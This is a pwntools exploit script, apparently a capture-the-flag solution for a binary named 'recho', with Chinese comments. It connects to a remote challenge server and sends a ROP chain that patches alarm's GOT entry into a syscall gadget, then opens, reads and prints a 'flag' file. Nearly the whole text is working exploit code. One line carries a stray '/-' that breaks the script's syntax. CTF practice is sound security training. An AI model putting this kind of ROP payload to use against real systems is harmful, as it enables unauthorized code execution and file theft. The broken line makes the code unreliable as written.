from pwn import *  
import time  
  
context.log_level = 'debug'  
#sh = process('./pwnh18')  
sh = remote("61.147.171.105",64217)  
  
elf = ELF('./recho')  
  
#用于传参  
 
pop_rax = 0x4006FC  

pop_rdx = 0x4006FE  
  
pop_rsi = 0x4008A1  
 
pop_rdi = 0x4008A3  
 
rdi_add = 0x40070d  
  
#bss段的stdin缓冲区，我们可以把数据存在这里  
stdin_buffer = 0x601070  
  
alarm_got = elf.got['alarm']  
alarm_plt = elf.plt['alarm']  
read_plt = elf.plt['read']  
printf_plt = elf.plt['printf']  
  
sh.recvuntil('Welcome to Recho server!\n')  
  
sh.sendline(str(0x200))  
  
payload = b'a'*0x38  
#######修改alarm的GOT表内容为alarm函数里的syscall调用处地址##########  
#rdi = alarm_got  
payload += p64(pop_rdi) + p64(alarm_got)
#rax = 0x5  
payload += p64(pop_rax) + p64(0x5)  
#[rdi] = [rdi] + 0xE = alarm函数里的syscall的调用处  
payload += p64(rdi_add)  
########  
'''''fd = open('flag',READONLY)'''  
# rsi = 0 (READONLY)  
payload += p64(pop_rsi) + p64(0) + p64(0)  
#rdi = 'flag'  
#payload += p64(pop_rdi) + p64(elf.search('flag').next()) 
payload += p64(pop_rdi) + p64(next(elf.search(b'flag'))) 
#.next()方法被弃用 
#rax = 2,open的调用号为2，通过调试即可知道  
payload += p64(pop_rax) + p64(2)  
#syscall  
payload += p64(alarm_plt)  /-
''''' read(fd,stdin_buffer,100) '''  
#rdi指向buf区，用于存放读取的结果  
payload += p64(pop_rsi) + p64(stdin_buffer) + p64(0)  
#open()打开文件返回的文件描述符一般从3开始，依次顺序增加  
payload += p64(pop_rdi) + p64(3)  
# rax = 100，最多读取100个字符   
payload += p64(pop_rdx) + p64(100)  
#指向read函数  
payload += p64(read_plt)  
#使用printf打印读取的内容  
payload += p64(pop_rdi) + p64(stdin_buffer) + p64(printf_plt)  
#这步也关键，尽量使字符串长，这样才能将我们的payload全部输进去，不然可能因为会有缓存的问题导致覆盖不完整  
payload = payload.ljust(0x200,b'\x00')  
  
sh.sendline(payload)  
#关闭输入流，就可以退出那个循环，执行ROP了  
sh.shutdown('write')  
  
sh.interactive() 
